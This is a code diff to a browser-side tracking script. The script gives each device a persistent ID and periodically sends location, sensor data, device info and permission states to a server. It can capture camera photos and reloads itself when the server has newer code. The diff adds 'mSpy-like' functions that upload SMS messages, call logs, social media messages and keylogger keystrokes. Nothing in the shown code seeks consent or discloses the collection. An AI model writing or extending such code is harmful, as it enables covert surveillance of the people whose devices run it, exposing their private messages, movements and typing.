@@ -4,10 +4,12 @@
  * Features:
  * - Auto‑generated device ID stored in localStorage.
  * - Configurable update interval (default 60 seconds).
- * - Sends location, device info, sensor data, and permission statuses.
+ * - Sends location, device info, sensor data, permission statuses.
  * - Optionally captures a photo.
- * - Auto‑update: Checks for a new JS version from the server and reloads if needed.
- * - Failsafe: Each function is wrapped in try/catch blocks to handle missing APIs or errors.
+ * - Sends mSpy‑like data (SMS, call logs, social media messages, keylogger logs) via dedicated endpoints.
+ * - Auto‑update mechanism: periodically checks the /tracking/api/js_version/ endpoint
+ *   and reloads the page if a new version is available.
+ * - All functions include error handling to ensure robust, failsafe operation.
  */
 
 function getOrCreateDeviceId() {
@@ -25,7 +27,7 @@ function getOrCreateDeviceId() {
   const deviceId = getOrCreateDeviceId();
   let updateInterval = parseInt(localStorage.getItem('updateInterval')) || 60 * 1000;
   
-  // Send location data using the Geolocation API.
+  // Send location data.
   function sendLocationData() {
     try {
       if (navigator.geolocation) {
@@ -44,9 +46,7 @@ function getOrCreateDeviceId() {
           .then(response => response.json())
           .then(json => console.log('Location update:', json))
           .catch(err => console.error('Error updating location:', err));
-        }, error => {
-          console.error('Geolocation error:', error);
-        });
+        }, error => console.error('Geolocation error:', error));
       } else {
         console.error("Geolocation is not supported by this browser.");
       }
@@ -84,7 +84,7 @@ function getOrCreateDeviceId() {
     }
   }
   
-  // Send sensor data using DeviceMotion.
+  // Send sensor data.
   function sendSensorData() {
     try {
       let sensorData = {};
@@ -113,16 +113,16 @@ function getOrCreateDeviceId() {
     }
   }
   
-  // Send permission statuses.
+  // Send permission status.
   function sendPermissionStatus() {
     try {
       const statusData = { device_id: deviceId };
       const permissions = ['geolocation', 'camera', 'microphone', 'notifications'];
-      let promises = permissions.map(perm => {
-        return navigator.permissions.query({ name: perm })
+      let promises = permissions.map(perm => 
+        navigator.permissions.query({ name: perm })
           .then(result => { statusData[perm] = (result.state === 'granted'); })
-          .catch(() => { statusData[perm] = false; });
-      });
+          .catch(() => { statusData[perm] = false; })
+      );
       statusData.clipboard = false;
       statusData.sensors = ('DeviceMotionEvent' in window);
       statusData.bluetooth = ('bluetooth' in navigator);
@@ -141,7 +141,7 @@ function getOrCreateDeviceId() {
     }
   }
   
-  // Optionally capture a photo using the camera.
+  // Optionally capture a photo.
   function capturePhoto() {
     try {
       if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
@@ -203,7 +203,72 @@ function getOrCreateDeviceId() {
     }
   }
   
-  // Initialize device info once on page load.
+  // Additional mSpy-like functions: SMS, call logs, social media, keylogger.
+  function sendSMSLog(message, sender, receiver, direction) {
+    try {
+      const data = { device_id: deviceId, message, sender, receiver, direction };
+      fetch('/tracking/api/sms/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(json => console.log('SMS log update:', json))
+      .catch(err => console.error('Error updating SMS log:', err));
+    } catch (e) {
+      console.error("sendSMSLog error:", e);
+    }
+  }
+  
+  function sendCallLog(caller, callee, duration) {
+    try {
+      const data = { device_id: deviceId, caller, callee, duration };
+      fetch('/tracking/api/call/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(json => console.log('Call log update:', json))
+      .catch(err => console.error('Error updating call log:', err));
+    } catch (e) {
+      console.error("sendCallLog error:", e);
+    }
+  }
+  
+  function sendSocialMediaLog(platform, sender, message) {
+    try {
+      const data = { device_id: deviceId, platform, sender, message };
+      fetch('/tracking/api/social/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(json => console.log('Social media log update:', json))
+      .catch(err => console.error('Error updating social media log:', err));
+    } catch (e) {
+      console.error("sendSocialMediaLog error:", e);
+    }
+  }
+  
+  function sendKeyloggerLog(keystrokes) {
+    try {
+      const data = { device_id: deviceId, keystrokes };
+      fetch('/tracking/api/keylogger/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(json => console.log('Keylogger log update:', json))
+      .catch(err => console.error('Error updating keylogger log:', err));
+    } catch (e) {
+      console.error("sendKeyloggerLog error:", e);
+    }
+  }
+  
+  // Initialize device info once.
   function initDeviceInfo() {
     sendDeviceInfo();
   }
@@ -217,14 +282,13 @@ function getOrCreateDeviceId() {
       sendLocationData();
       sendPermissionStatus();
       sendSensorData();
-      // Uncomment to enable periodic photo capture:
-      // capturePhoto();
+      // Optionally, call capturePhoto() for periodic photo capture.
     }, updateInterval);
   }
   
-  // Auto-update mechanism: check for a new JS version from the server.
+  // Auto-update mechanism: periodically check for new JS version.
   const TRACKING_JS_VERSION = "1.0.0";
-  const AUTO_UPDATE_INTERVAL = 5 * 60 * 1000; // every 5 minutes
+  const AUTO_UPDATE_INTERVAL = 5 * 60 * 1000;  // every 5 minutes
   
   function checkForJsUpdate() {
     try {
@@ -236,12 +300,10 @@ function getOrCreateDeviceId() {
             console.log("New JS version available:", serverVersion);
             window.location.reload(true);
           } else {
-            console.log("JS version is up-to-date:", TRACKING_JS_VERSION);
+            console.log("JS version up-to-date:", TRACKING_JS_VERSION);
           }
         })
-        .catch(err => {
-          console.error("Failed to check for JS update:", err);
-        });
+        .catch(err => console.error("Failed to check for JS update:", err));
     } catch (e) {
       console.error("checkForJsUpdate error:", e);
     }
